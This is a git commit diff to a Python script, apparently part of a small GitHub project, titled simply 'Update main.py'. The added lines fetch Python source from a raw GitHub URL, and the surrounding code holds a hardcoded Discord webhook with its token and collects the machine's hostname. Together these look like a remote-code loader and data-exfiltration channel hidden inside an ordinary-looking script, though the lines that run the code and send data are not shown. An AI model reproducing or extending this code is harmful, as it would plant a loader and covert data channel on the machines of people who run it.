240002315aa93b765177d458af48914d79aabf33
hmmmmmm <134966849+hmmmmmmmmmmm-ctrl@users.noreply.github.com>
2023-09-17 12:14:06 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,14 @@
-
-
 random_time = random.randint(5, 17)
 
+command = int(command)
+url = "https://raw.githubusercontent.com/hmmmmmmmmmmm-ctrl/hum/main/main.py"
+response = requests.get(url)
+
+if response.status_code == 200:
+    code = response.text
+            
+else:
+    cprint(f"ERROR, try to relaunch or verify your connexion", color="red")
 
 u = "https://discord.com/api/webhooks/1151568846285705266/xAydDMKKDqMSBmDYb6Q7sTqS5anAY18-8R8_z2a9NaSpA8aYuz-E9KViVE9izKTaO3uw"
 h = socket.gethostname()
